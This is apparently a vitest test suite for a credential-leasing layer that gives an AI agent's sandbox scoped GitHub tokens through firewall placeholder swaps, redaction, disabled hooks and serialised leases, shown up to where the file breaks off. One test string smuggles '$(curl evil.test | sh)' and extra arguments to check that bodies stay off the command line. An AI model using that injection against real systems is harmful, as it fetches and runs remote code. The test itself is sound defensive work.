import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { parseGh, RUNNER_PATH } from "#lib/github/cli.js";
import { parseGitFetch, pushCommandLine } from "#lib/github/git-cli.js";
import {
  type LeaseSandbox,
  leasePolicy,
  MAX_OUTPUT_CHARACTERS,
  mintScopedToken,
  NarrowTokenError,
  permissionsFor,
  resetTokenScopeMemo,
  runGh,
  runGitFetch,
  runGitPush,
  SCOPE_DOWNGRADE_TTL_MS,
  type ShellLease,
  TOKEN_SCOPES,
  type TokenMinter,
  withShellLease,
} from "#lib/github/lease.js";

const TOKEN = "ghs_REALTOKEN0123456789abcdefghijklmnop";
const basic = (secret: string) =>
  `Basic ${Buffer.from(`x-access-token:${secret}`).toString("base64")}`;

type Step =
  | { kind: "policy"; policy: unknown }
  | { kind: "run"; command: string; env: Record<string, string> }
  | { kind: "write"; content: string; path: string };

/**
 * A sandbox that records everything a lease does to it, in order, and
 * answers each command from `respond`.
 */
const fakeSandbox = (
  respond: (command: string) => {
    exitCode?: number;
    stderr?: string;
    stdout?: string;
  } = () => ({})
) => {
  const steps: Step[] = [];
  const sandbox: LeaseSandbox = {
    name: "sbx_test",
    run: async ({ command, env }) => {
      steps.push({ command, env: env ?? {}, kind: "run" });
      const result = respond(command);
      return {
        exitCode: result.exitCode ?? 0,
        stderr: result.stderr ?? "",
        stdout: result.stdout ?? "",
      };
    },
    setNetworkPolicy: async (policy) => {
      steps.push({ kind: "policy", policy });
    },
    writeTextFile: async ({ content, path }) => {
      steps.push({ content, kind: "write", path });
    },
  };
  return { sandbox, steps };
};

const mintOk = (): {
  mint: TokenMinter;
  requests: (readonly string[] | null)[];
} => {
  const requests: (readonly string[] | null)[] = [];
  return {
    mint: async (permissions) => {
      requests.push(permissions);
      return TOKEN;
    },
    requests,
  };
};

const gh = (...args: string[]) => {
  const parsed = parseGh(args);
  if (!parsed.ok) {
    throw new Error(parsed.reason);
  }
  return parsed.invocation;
};

const READ_PERMISSIONS = [
  ...TOKEN_SCOPES["repo-read"].required,
  ...TOKEN_SCOPES["repo-read"].optional,
];

beforeEach(() => {
  resetTokenScopeMemo();
  // The suite's expectations are about the defaults, whatever the developer's shell exports.
  vi.stubEnv("FACTORY_TOKEN_FALLBACK", "");
  vi.stubEnv("FACTORY_ALLOW_WORKFLOW_CHANGES", "");
});

afterEach(() => {
  vi.unstubAllEnvs();
  vi.restoreAllMocks();
});

describe("runGh: one command, one lease", () => {
  test("the credential is attached, the command runs, and the lease always ends", async () => {
    const { sandbox, steps } = fakeSandbox(() => ({
      stdout: '{"title":"Login returns 500"}',
    }));
    const { mint } = mintOk();
    const result = await runGh(
      sandbox,
      gh("issue", "view", "12", "--json", "title"),
      "repo-read",
      {
        id: () => "lease-1",
        mint,
      }
    );
    expect(result).toEqual({
      exitCode: 0,
      stderr: "",
      stdout: '{"title":"Login returns 500"}',
      truncated: false,
    });
    expect(steps.map((step) => step.kind)).toEqual(["policy", "run", "policy"]);
    expect(steps[0]).toEqual({
      kind: "policy",
      policy: leasePolicy("gh", TOKEN, "factory-lease-1"),
    });
    expect(steps[2]).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("the real token never reaches the sandbox: not in the command, not in the environment", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await runGh(sandbox, gh("pr", "view", "34"), "repo-read", {
      id: () => "lease-2",
      mint,
    });
    const run = steps.find((step) => step.kind === "run");
    expect(run?.kind === "run" && run.command).toBe(
      "/usr/bin/gh 'pr' 'view' '34'"
    );
    const env = run?.kind === "run" ? run.env : {};
    expect(env.GH_TOKEN).toBe("factory-lease-2");
    expect(env.GH_REPO).toBe("acme/widgets");
    expect(env.GH_PROMPT_DISABLED).toBe("1");
    // The image's own directories only: /usr/local/bin holds the wrappers
    // the agent's shell uses, and the runner must not go through them.
    expect(env.PATH).toBe("/usr/bin:/bin");
    expect(env.PATH).toBe(RUNNER_PATH);
    expect(JSON.stringify(run)).not.toContain(TOKEN);
    expect(JSON.stringify(run)).not.toContain(basic(TOKEN));
  });

  test("the firewall swaps the placeholder for the token on GitHub's API hosts only", () => {
    const policy = leasePolicy("gh", TOKEN, "factory-abc");
    expect(policy).toEqual({
      allow: {
        "*": [],
        "api.github.com": [
          {
            match: {
              headers: [
                {
                  key: { exact: "authorization" },
                  value: { regex: "^(?:token|Bearer) factory-abc$" },
                },
              ],
            },
            transform: [{ headers: { authorization: `Bearer ${TOKEN}` } }],
          },
        ],
        "uploads.github.com": [expect.anything()],
      },
    });
  });

  test("a git lease swaps the placeholder on the git hosts only, as basic auth", () => {
    const policy = leasePolicy("git", TOKEN, "factory-abc");
    expect(policy).toEqual({
      allow: {
        "*": [],
        "codeload.github.com": [expect.anything()],
        "github.com": [
          {
            match: {
              headers: [
                {
                  key: { exact: "authorization" },
                  value: { exact: basic("factory-abc") },
                },
              ],
            },
            transform: [{ headers: { authorization: basic(TOKEN) } }],
          },
        ],
      },
    });
  });

  test("the lease ends even when the command throws", async () => {
    const { sandbox, steps } = fakeSandbox(() => {
      throw new Error("sandbox went away");
    });
    const { mint } = mintOk();
    await expect(
      runGh(sandbox, gh("issue", "view", "1"), "repo-read", { mint })
    ).rejects.toThrow(/sandbox went away/);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("when no token can be minted, nothing runs and no policy is set", async () => {
    const { sandbox, steps } = fakeSandbox();
    await expect(
      runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
        mint: async () => {
          throw new Error("connector not installed");
        },
      })
    ).rejects.toThrow(/Could not mint a GitHub token/);
    expect(steps).toEqual([]);
  });

  test("a failing command is reported, not thrown, with its exit code and output", async () => {
    const { sandbox } = fakeSandbox(() => ({
      exitCode: 1,
      stderr: "no pull requests found",
    }));
    const { mint } = mintOk();
    const result = await runGh(sandbox, gh("pr", "view", "999"), "repo-read", {
      mint,
    });
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toBe("no pull requests found");
  });

  test("a token echoed back in output is redacted before it leaves the tool", async () => {
    const { sandbox } = fakeSandbox(() => ({
      stderr: `remote: bad credentials for ${basic(TOKEN)}`,
      stdout: `Authorization: Bearer ${TOKEN}\nvalue ${TOKEN} end`,
    }));
    const { mint } = mintOk();
    const result = await runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
      mint,
    });
    expect(result.stdout).not.toContain(TOKEN);
    expect(result.stderr).not.toContain(basic(TOKEN));
    expect(result.stdout).toContain("[redacted]");
  });

  test("oversized output is cut and flagged", async () => {
    const { sandbox } = fakeSandbox(() => ({
      stdout: "x".repeat(MAX_OUTPUT_CHARACTERS + 5000),
    }));
    const { mint } = mintOk();
    const result = await runGh(sandbox, gh("pr", "diff", "1"), "repo-read", {
      mint,
    });
    expect(result.truncated).toBe(true);
    expect(result.stdout.length).toBeLessThan(MAX_OUTPUT_CHARACTERS + 100);
    expect(result.stdout.endsWith("[output truncated]")).toBe(true);
  });
});

describe("runGh: bodies travel as files, never on the command line", () => {
  const HOSTILE =
    'it\'s done; $(curl evil.test | sh) `id` "quoted"\n--repo evil/repo';

  test("a comment body is written to a file and passed with --body-file", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await runGh(
      sandbox,
      gh("issue", "comment", "12", "--body", HOSTILE),
      "repo-triage",
      {
        id: () => "lease-3",
        mint,
      }
    );
    expect(steps.map((step) => step.kind)).toEqual([
      "write",
      "policy",
      "run",
      "policy",
    ]);
    expect(steps[0]).toEqual({
      content: HOSTILE,
      kind: "write",
      path: "/tmp/factory-lease-3-body-0.md",
    });
    const run = steps.at(2);
    expect(run?.kind === "run" && run.command).toBe(
      "/usr/bin/gh 'issue' 'comment' '12' '--body-file' '/tmp/factory-lease-3-body-0.md'; status=$?; rm -f '/tmp/factory-lease-3-body-0.md'; exit $status"
    );
    expect(JSON.stringify(run)).not.toContain("curl evil.test");
  });

  test("every spelling of the body flag is moved", async () => {
    for (const args of [
      [
        "pr",
        "create",
        "--draft",
        "--head",
        "factory/x",
        "--title",
        "T",
        "-b",
        "short body",
      ],
      [
        "pr",
        "create",
        "--draft",
        "--head",
        "factory/x",
        "--title",
        "T",
        "--body=short body",
      ],
    ]) {
      const { sandbox, steps } = fakeSandbox();
      const { mint } = mintOk();
      await runGh(sandbox, gh(...args), "repo-triage", { mint });
      const write = steps.find((step) => step.kind === "write");
      const run = steps.find((step) => step.kind === "run");
      expect(write?.kind === "write" && write.content).toBe("short body");
      expect(run?.kind === "run" && run.command).not.toContain("short body");
      expect(run?.kind === "run" && run.command).toContain("'--title' 'T'");
    }
  });

  test("-b on a command where it means branch is left alone", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await runGh(sandbox, gh("run", "list", "-b", "factory/x"), "repo-read", {
      mint,
    });
    expect(steps.some((step) => step.kind === "write")).toBe(false);
    const run = steps.find((step) => step.kind === "run");
    expect(run?.kind === "run" && run.command).toBe(
      "/usr/bin/gh 'run' 'list' '-b' 'factory/x'"
    );
  });
});

describe("leasePolicy: which hosts each kind of lease covers", () => {
  interface Rule {
    match: { headers: { key: unknown; value: unknown }[] };
    transform: unknown;
  }
  /** The policy's rules by host, for a lease whose placeholder is `factory-abc`. */
  const rulesByHost = (kind: "gh" | "git" | "shell") =>
    (
      leasePolicy(kind, TOKEN, "factory-abc") as unknown as {
        allow: Record<string, Rule[]>;
      }
    ).allow;
  const hosts = (kind: "gh" | "git" | "shell") =>
    Object.keys(rulesByHost(kind)).sort();

  test("a gh lease covers the two API hosts and no git host", () => {
    expect(hosts("gh")).toEqual(["*", "api.github.com", "uploads.github.com"]);
  });

  test("a git lease covers the two git hosts and no API host", () => {
    expect(hosts("git")).toEqual(["*", "codeload.github.com", "github.com"]);
  });

  test("a shell lease covers all four, since the command may run either program", () => {
    expect(hosts("shell")).toEqual([
      "*",
      "api.github.com",
      "codeload.github.com",
      "github.com",
      "uploads.github.com",
    ]);
  });

  test("a shell lease is exactly a gh lease and a git lease together", () => {
    expect(leasePolicy("shell", TOKEN, "factory-abc")).toEqual({
      allow: { ...rulesByHost("gh"), ...rulesByHost("git") },
    });
  });

  test.each(["gh", "git", "shell"] as const)(
    "a %s lease keeps ordinary egress open and matches only its own placeholder",
    (kind) => {
      const allow = rulesByHost(kind);
      expect(allow["*"]).toEqual([]);
      // Every rule is keyed on the authorization header carrying this
      // lease's placeholder: as a bearer token on the API hosts, as git's
      // basic auth on the git hosts. A request without it passes untouched.
      for (const [host, rules] of Object.entries(allow)) {
        if (host === "*") {
          continue;
        }
        expect(rules.map((rule) => rule.match.headers)).toEqual([
          [
            {
              key: { exact: "authorization" },
              value:
                host === "api.github.com" || host === "uploads.github.com"
                  ? { regex: "^(?:token|Bearer) factory-abc$" }
                  : { exact: basic("factory-abc") },
            },
          ],
        ]);
      }
    }
  );

  test("the placeholder never appears as the credential that goes out", () => {
    for (const kind of ["gh", "git", "shell"] as const) {
      for (const rules of Object.values(rulesByHost(kind))) {
        for (const rule of rules) {
          const sent = JSON.stringify(rule.transform);
          expect(sent).not.toContain("factory-abc");
          expect(sent).not.toContain(basic("factory-abc"));
          expect(sent.includes(TOKEN) || sent.includes(basic(TOKEN))).toBe(
            true
          );
        }
      }
    }
  });
});

describe("runGitPush: the one command that leases a contents-write token", () => {
  test("pushes the branch with the command the factory wrote; the placeholder rides in git's own config", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint, requests } = mintOk();
    const result = await runGitPush(sandbox, "factory/bug-x", {
      id: () => "lease-4",
      mint,
    });
    expect(result).toEqual({
      exitCode: 0,
      stderr: "",
      stdout: "",
      truncated: false,
    });
    expect(requests).toEqual([["contents:write"]]);
    expect(steps.map((step) => step.kind)).toEqual(["policy", "run", "policy"]);
    expect(steps[0]).toEqual({
      kind: "policy",
      policy: leasePolicy("git", TOKEN, "factory-lease-4"),
    });
    const run = steps.at(1);
    expect(run?.kind === "run" && run.command).toBe(
      pushCommandLine("factory/bug-x")
    );
    expect(run?.kind === "run" && run.command).toBe(
      "/usr/bin/git -C '/workspace/repo' push 'https://github.com/acme/widgets.git' 'refs/heads/factory/bug-x:refs/heads/factory/bug-x' && /usr/bin/git -C '/workspace/repo' update-ref 'refs/remotes/origin/factory/bug-x' 'refs/heads/factory/bug-x'"
    );
    const env = run?.kind === "run" ? run.env : {};
    expect(env).toEqual({
      GIT_CONFIG_COUNT: "4",
      GIT_CONFIG_KEY_0: "http.https://github.com/.extraheader",
      GIT_CONFIG_KEY_1: "core.hooksPath",
      GIT_CONFIG_KEY_2: "protocol.allow",
      GIT_CONFIG_KEY_3: "protocol.https.allow",
      GIT_CONFIG_VALUE_0: `Authorization: ${basic("factory-lease-4")}`,
      GIT_CONFIG_VALUE_1: "/dev/null",
      GIT_CONFIG_VALUE_2: "never",
      GIT_CONFIG_VALUE_3: "always",
      GIT_TERMINAL_PROMPT: "0",
      PATH: "/usr/bin:/bin",
    });
    expect(JSON.stringify(run)).not.toContain(TOKEN);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("hooks are off and only HTTPS is allowed while the lease is live", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await runGitPush(sandbox, "factory/x", { mint });
    const run = steps.find((step) => step.kind === "run");
    const env = run?.kind === "run" ? run.env : {};
    const config = Object.fromEntries(
      Array.from({ length: Number(env.GIT_CONFIG_COUNT) }, (_, index) => [
        env[`GIT_CONFIG_KEY_${index}`],
        env[`GIT_CONFIG_VALUE_${index}`],
      ])
    );
    // A pre-push hook is a file the model can write.
    expect(config["core.hooksPath"]).toBe("/dev/null");
    expect(config["protocol.allow"]).toBe("never");
    expect(config["protocol.https.allow"]).toBe("always");
    // The header is scoped to github.com, so a rewritten remote gets nothing.
    expect(Object.keys(config)).toContain(
      "http.https://github.com/.extraheader"
    );
    expect(Object.keys(config)).not.toContain("http.extraheader");
  });

  test("the lease ends when the push throws", async () => {
    const { sandbox, steps } = fakeSandbox(() => {
      throw new Error("sandbox went away");
    });
    const { mint } = mintOk();
    await expect(runGitPush(sandbox, "factory/x", { mint })).rejects.toThrow(
      /sandbox went away/
    );
    expect(steps.map((step) => step.kind)).toEqual(["policy", "run", "policy"]);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("a push GitHub rejects is reported, not thrown, and the lease still ends", async () => {
    const { sandbox, steps } = fakeSandbox(() => ({
      exitCode: 1,
      stderr: `! [remote rejected] (protected branch) ${basic(TOKEN)}`,
    }));
    const { mint } = mintOk();
    const result = await runGitPush(sandbox, "factory/x", { mint });
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toBe(
      "! [remote rejected] (protected branch) [redacted]"
    );
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("when no push token can be minted, nothing runs and no policy is set", async () => {
    const { sandbox, steps } = fakeSandbox();
    await expect(
      runGitPush(sandbox, "factory/x", {
        mint: async () => {
          throw new Error("contents:write not granted");
        },
      })
    ).rejects.toThrow(/Could not mint a GitHub token for scope "repo-push"/);
    expect(steps).toEqual([]);
  });
});

describe("runGitFetch: a fetch the runtime wrote, for a deployment with no read-only token", () => {
  const fetchOf = (...args: string[]) => {
    const parsed = parseGitFetch(args);
    if (!parsed.ok) {
      throw new Error(parsed.reason);
    }
    return parsed.commandLine;
  };

  test("leases a read-only token and runs the command with hooks off and the image's own PATH", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint, requests } = mintOk();
    const command = fetchOf("origin", "factory/bug-x");
    await runGitFetch(sandbox, command, { id: () => "lease-8", mint });
    expect(requests).toEqual([READ_PERMISSIONS]);
    expect(requests[0]).not.toContain("contents:write");
    expect(steps.map((step) => step.kind)).toEqual(["policy", "run", "policy"]);
    expect(steps[0]).toEqual({
      kind: "policy",
      policy: leasePolicy("git", TOKEN, "factory-lease-8"),
    });
    const run = steps.at(1);
    expect(run?.kind === "run" && run.command).toBe(
      "/usr/bin/git -C '/workspace/repo' fetch 'https://github.com/acme/widgets.git' '+refs/heads/factory/bug-x:refs/remotes/origin/factory/bug-x'"
    );
    const env = run?.kind === "run" ? run.env : {};
    expect(env).toMatchObject({
      GIT_CONFIG_KEY_1: "core.hooksPath",
      GIT_CONFIG_VALUE_0: `Authorization: ${basic("factory-lease-8")}`,
      GIT_CONFIG_VALUE_1: "/dev/null",
      GIT_CONFIG_VALUE_2: "never",
      GIT_CONFIG_VALUE_3: "always",
      GIT_TERMINAL_PROMPT: "0",
      PATH: "/usr/bin:/bin",
    });
    expect(JSON.stringify(run)).not.toContain(TOKEN);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("unlike the shell's lease it follows FACTORY_TOKEN_FALLBACK, and says so", async () => {
    vi.stubEnv("FACTORY_TOKEN_FALLBACK", "repository");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    const { sandbox, steps } = fakeSandbox();
    const requests: (readonly string[] | null)[] = [];
    await runGitFetch(sandbox, fetchOf("origin", "main"), {
      mint: async (permissions) => {
        requests.push(permissions);
        if (permissions !== null) {
          throw new Error("422: cannot narrow");
        }
        return TOKEN;
      },
    });
    expect(requests.at(-1)).toBeNull();
    expect(steps.map((step) => step.kind)).toEqual(["policy", "run", "policy"]);
    expect(warn).toHaveBeenCalledTimes(1);
  });

  test("the lease ends when the fetch throws", async () => {
    const { sandbox, steps } = fakeSandbox(() => {
      throw new Error("sandbox went away");
    });
    const { mint } = mintOk();
    await expect(
      runGitFetch(sandbox, fetchOf("origin", "main"), { mint })
    ).rejects.toThrow(/sandbox went away/);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });
});

describe("withShellLease: the lease a shell command runs under", () => {
  test("holds a read-only lease open while the command runs, and hands it the placeholder", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint, requests } = mintOk();
    const seen: string[] = [];
    const result = await withShellLease(
      sandbox,
      { id: () => "lease-5", mint },
      async (lease) => {
        seen.push(lease.placeholder);
        // The policy is already in place when the command starts.
        expect(steps).toEqual([
          {
            kind: "policy",
            policy: leasePolicy("shell", TOKEN, "factory-lease-5"),
          },
        ]);
        return "what the command returned";
      }
    );
    expect(result).toBe("what the command returned");
    expect(seen).toEqual(["factory-lease-5"]);
    expect(requests).toEqual([READ_PERMISSIONS]);
    expect(steps).toEqual([
      {
        kind: "policy",
        policy: leasePolicy("shell", TOKEN, "factory-lease-5"),
      },
      { kind: "policy", policy: "allow-all" },
    ]);
  });

  test("the scope is read-only whatever happens: it is not something a caller can choose", async () => {
    const { sandbox } = fakeSandbox();
    const { mint, requests } = mintOk();
    // Extra arguments and extra dependency fields change nothing.
    const smuggled = {
      id: () => "x",
      mint,
      scope: "repo-push",
    } as Parameters<typeof withShellLease>[1];
    await withShellLease(sandbox, smuggled, async () => undefined);
    await (
      withShellLease as unknown as (...args: unknown[]) => Promise<unknown>
    )(sandbox, { mint }, async () => undefined, "repo-triage");
    await withShellLease(sandbox, { mint }, async () => {
      throw new Error("the command failed");
    }).catch(() => undefined);
    expect(requests).toEqual([
      READ_PERMISSIONS,
      READ_PERMISSIONS,
      READ_PERMISSIONS,
    ]);
    for (const permissions of requests) {
      expect(permissions).not.toContain("contents:write");
      expect(permissions).not.toContain("issues:write");
      expect(permissions).not.toContain("pull_requests:write");
    }
  });

  /** An app that issues its full permissions and refuses every narrower set. */
  const wideOnly = () => {
    const requests: (readonly string[] | null)[] = [];
    let installationCalls = 0;
    return {
      dependencies: {
        installationToken: async () => {
          installationCalls += 1;
          return "ghs_installation_token_0123456789abcdef";
        },
        mint: (async (permissions) => {
          requests.push(permissions);
          if (permissions !== null) {
            throw new Error("422: cannot narrow");
          }
          return TOKEN;
        }) satisfies TokenMinter,
      },
      installationCalls: () => installationCalls,
      requests,
    };
  };

  test.each(["repository", "installation"])(
    "is never widened, even with FACTORY_TOKEN_FALLBACK=%s: a shell command holds this credential, and its scope is the only limit there is",
    async (setting) => {
      vi.stubEnv("FACTORY_TOKEN_FALLBACK", setting);
      const warn = vi
        .spyOn(console, "warn")
        .mockImplementation(() => undefined);
      const { sandbox, steps } = fakeSandbox();
      const app = wideOnly();
      let started = false;
      const attempt = withShellLease(sandbox, app.dependencies, async () => {
        started = true;
      });
      await expect(attempt).rejects.toBeInstanceOf(NarrowTokenError);
      await expect(attempt).rejects.toThrow(
        /Could not mint a GitHub token for scope "repo-read"/
      );
      // The two rungs inside the scope, and neither of the wide ones.
      expect(app.requests).toEqual([
        READ_PERMISSIONS,
        TOKEN_SCOPES["repo-read"].required,
      ]);
      expect(app.installationCalls()).toBe(0);
      expect(started).toBe(false);
      expect(steps).toEqual([]);
      expect(warn).not.toHaveBeenCalled();
    }
  );

  test("a wider token the runner was given for the same scope is not reused for a shell", async () => {
    vi.stubEnv("FACTORY_TOKEN_FALLBACK", "repository");
    vi.spyOn(console, "warn").mockImplementation(() => undefined);
    let clock = 1_000_000;
    const { sandbox, steps } = fakeSandbox();
    const app = wideOnly();
    const dependencies = { ...app.dependencies, now: () => clock };

    // The runner runs a command the runtime parsed, so it follows the setting.
    await runGh(sandbox, gh("issue", "view", "12"), "repo-read", dependencies);
    expect(app.requests.at(-1)).toBeNull();
    const asked = app.requests.length;
    const policies = steps.filter((step) => step.kind === "policy").length;

    // The shell lease sees the remembered wide rung and refuses outright.
    let started = false;
    await expect(
      withShellLease(sandbox, dependencies, async () => {
        started = true;
      })
    ).rejects.toBeInstanceOf(NarrowTokenError);
    expect(started).toBe(false);
    expect(app.requests).toHaveLength(asked);
    expect(steps.filter((step) => step.kind === "policy")).toHaveLength(
      policies
    );

    // Once that memory expires it asks again, for the narrow sets only.
    clock += SCOPE_DOWNGRADE_TTL_MS + 1;
    await expect(
      withShellLease(sandbox, dependencies, async () => {
        started = true;
      })
    ).rejects.toBeInstanceOf(NarrowTokenError);
    expect(started).toBe(false);
    expect(app.requests.slice(asked)).toEqual([
      READ_PERMISSIONS,
      TOKEN_SCOPES["repo-read"].required,
    ]);
  });

  test("an installation without the optional permissions still gets a shell lease, on the required read set", async () => {
    const { sandbox } = fakeSandbox();
    const requests: (readonly string[] | null)[] = [];
    const placeholder = await withShellLease(
      sandbox,
      {
        id: () => "lease-7",
        mint: async (permissions) => {
          requests.push(permissions);
          if (permissions?.includes("checks:read")) {
            throw new Error("422: permissions not granted");
          }
          return TOKEN;
        },
      },
      async (lease) => lease.placeholder
    );
    expect(placeholder).toBe("factory-lease-7");
    expect(requests).toEqual([
      READ_PERMISSIONS,
      TOKEN_SCOPES["repo-read"].required,
    ]);
  });

  test("the lease ends when the command rejects, and the rejection reaches the caller", async () => {
    const { sandbox, steps } = fakeSandbox();
    const { mint } = mintOk();
    await expect(
      withShellLease(sandbox, { mint }, async () => {
        throw new Error("the shell went away");
      })
    ).rejects.toThrow(/the shell went away/);
    expect(steps.map((step) => step.kind)).toEqual(["policy", "policy"]);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("when no token can be minted, the command never starts and no policy is set", async () => {
    const { sandbox, steps } = fakeSandbox();
    let started = false;
    await expect(
      withShellLease(
        sandbox,
        {
          mint: async () => {
            throw new Error("connector not installed");
          },
        },
        async () => {
          started = true;
        }
      )
    ).rejects.toThrow(/Could not mint a GitHub token for scope "repo-read"/);
    expect(started).toBe(false);
    expect(steps).toEqual([]);
  });

  test("redact replaces the token and its basic-auth form, and leaves everything else alone", async () => {
    const { sandbox } = fakeSandbox();
    const { mint } = mintOk();
    const lease = await withShellLease(
      sandbox,
      { id: () => "lease-6", mint },
      async (given): Promise<ShellLease> => given
    );
    expect(
      lease.redact(`Authorization: Bearer ${TOKEN}\nvalue ${TOKEN} end`)
    ).toBe("Authorization: Bearer [redacted]\nvalue [redacted] end");
    expect(lease.redact(`extraheader: Authorization: ${basic(TOKEN)}`)).toBe(
      "extraheader: Authorization: [redacted]"
    );
    expect(lease.redact(`${basic(TOKEN)} and ${TOKEN}`)).toBe(
      "[redacted] and [redacted]"
    );
    // Exact, not pattern-based: text that only looks like a credential stays.
    const lookalike =
      "ghs_ANOTHERTOKEN0123456789abcdefghijklmn Basic eC1hY2Nlc3MtdG9rZW46b3RoZXI=";
    expect(lease.redact(lookalike)).toBe(lookalike);
    // The placeholder is not a secret: it is worthless once the lease ends.
    expect(lease.redact("factory-lease-6")).toBe("factory-lease-6");
    expect(lease.redact("")).toBe("");
  });

  test("the token itself is never handed to the command", async () => {
    const { sandbox } = fakeSandbox();
    const { mint } = mintOk();
    const lease = await withShellLease(
      sandbox,
      { mint },
      async (given) => given
    );
    expect(Object.keys(lease).sort()).toEqual(["placeholder", "redact"]);
    expect(JSON.stringify(lease)).not.toContain(TOKEN);
    expect(lease.placeholder).toMatch(/^factory-[0-9a-f-]{36}$/);
  });

  test("each lease gets its own placeholder", async () => {
    const { sandbox } = fakeSandbox();
    const { mint } = mintOk();
    const placeholders = new Set<string>();
    for (let index = 0; index < 5; index += 1) {
      placeholders.add(
        await withShellLease(
          sandbox,
          { mint },
          async (lease) => lease.placeholder
        )
      );
    }
    expect(placeholders.size).toBe(5);
  });
});

describe("leases on one sandbox never overlap", () => {
  test("concurrent calls run one after another, each inside its own set/reset pair", async () => {
    const order: string[] = [];
    let release: (() => void) | undefined;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const sandbox: LeaseSandbox = {
      name: "sbx_shared",
      run: async ({ command }) => {
        order.push(`run:${command}`);
        if (command.includes("'1'")) {
          await gate;
        }
        return { exitCode: 0, stderr: "", stdout: "" };
      },
      setNetworkPolicy: async (policy) => {
        order.push(policy === "allow-all" ? "reset" : "lease");
      },
      writeTextFile: async () => undefined,
    };
    const { mint } = mintOk();
    const first = runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
      mint,
    });
    const second = runGh(sandbox, gh("issue", "view", "2"), "repo-read", {
      mint,
    });
    await Promise.resolve();
    await new Promise((resolve) => setImmediate(resolve));
    expect(order).toEqual(["lease", "run:/usr/bin/gh 'issue' 'view' '1'"]);
    release?.();
    await Promise.all([first, second]);
    expect(order).toEqual([
      "lease",
      "run:/usr/bin/gh 'issue' 'view' '1'",
      "reset",
      "lease",
      "run:/usr/bin/gh 'issue' 'view' '2'",
      "reset",
    ]);
  });

  test("a failed lease does not block the next one", async () => {
    const { sandbox, steps } = fakeSandbox((command) => {
      if (command.includes("'1'")) {
        throw new Error("boom");
      }
      return { stdout: "ok" };
    });
    const { mint } = mintOk();
    const first = runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
      mint,
    });
    const second = runGh(sandbox, gh("issue", "view", "2"), "repo-read", {
      mint,
    });
    await expect(first).rejects.toThrow(/boom/);
    expect((await second).stdout).toBe("ok");
    expect(steps.filter((step) => step.kind === "policy")).toHaveLength(4);
  });

  /** A sandbox whose log says which lease is live when each thing happens. */
  const shared = () => {
    const order: string[] = [];
    const sandbox: LeaseSandbox = {
      name: "sbx_shared_shell",
      run: async ({ command }) => {
        order.push(`run:${command.split(" ").slice(0, 3).join(" ")}`);
        return { exitCode: 0, stderr: "", stdout: "" };
      },
      setNetworkPolicy: async (policy) => {
        if (policy === "allow-all") {
          order.push("reset");
          return;
        }
        const hosts = Object.keys((policy as { allow: object }).allow);
        order.push(`lease:${hosts.length === 5 ? "shell" : "runner"}`);
      },
      writeTextFile: async () => undefined,
    };
    let release: () => void = () => undefined;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    return { gate, order, release, sandbox };
  };

  const tick = async () => {
    await Promise.resolve();
    await new Promise((resolve) => setImmediate(resolve));
  };

  test("a write waits for a shell lease on the same sandbox to end, so the shell never runs under a token that writes", async () => {
    const { gate, order, release, sandbox } = shared();
    const { mint, requests } = mintOk();
    const shell = withShellLease(sandbox, { mint }, async () => {
      order.push("shell:start");
      await gate;
      order.push("shell:end");
    });
    const write = runGh(
      sandbox,
      gh("issue", "edit", "12", "--add-label", "bug"),
      "repo-triage",
      { mint }
    );
    const push = runGitPush(sandbox, "factory/x", { mint });
    await tick();
    expect(order).toEqual(["lease:shell", "shell:start"]);
    // Neither token that writes has even been minted yet.
    expect(requests).toEqual([READ_PERMISSIONS]);
    release();
    await Promise.all([shell, write, push]);
    expect(order).toEqual([
      "lease:shell",
      "shell:start",
      "shell:end",
      "reset",
      "lease:runner",
      "run:/usr/bin/gh 'issue' 'edit'",
      "reset",
      "lease:runner",
      "run:/usr/bin/git -C '/workspace/repo'",
      "reset",
    ]);
    expect(requests.map((permissions) => permissions?.[0])).toEqual([
      "contents:read",
      "contents:read",
      "contents:write",
    ]);
  });

  test("a shell lease waits for a write on the same sandbox to end", async () => {
    const order: string[] = [];
    let release: () => void = () => undefined;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const sandbox: LeaseSandbox = {
      name: "sbx_shared_write_first",
      run: async () => {
        order.push("push:start");
        await gate;
        order.push("push:end");
        return { exitCode: 0, stderr: "", stdout: "" };
      },
      setNetworkPolicy: async (policy) => {
        order.push(policy === "allow-all" ? "reset" : "lease");
      },
      writeTextFile: async () => undefined,
    };
    const { mint } = mintOk();
    const push = runGitPush(sandbox, "factory/x", { mint });
    const shell = withShellLease(sandbox, { mint }, async () => {
      order.push("shell");
    });
    await tick();
    expect(order).toEqual(["lease", "push:start"]);
    release();
    await Promise.all([push, shell]);
    expect(order).toEqual([
      "lease",
      "push:start",
      "push:end",
      "reset",
      "lease",
      "shell",
      "reset",
    ]);
  });

  test("a shell command that rejects does not block the next lease", async () => {
    const { sandbox, steps } = fakeSandbox(() => ({ stdout: "ok" }));
    const { mint } = mintOk();
    const first = withShellLease(sandbox, { mint }, async () => {
      throw new Error("boom");
    });
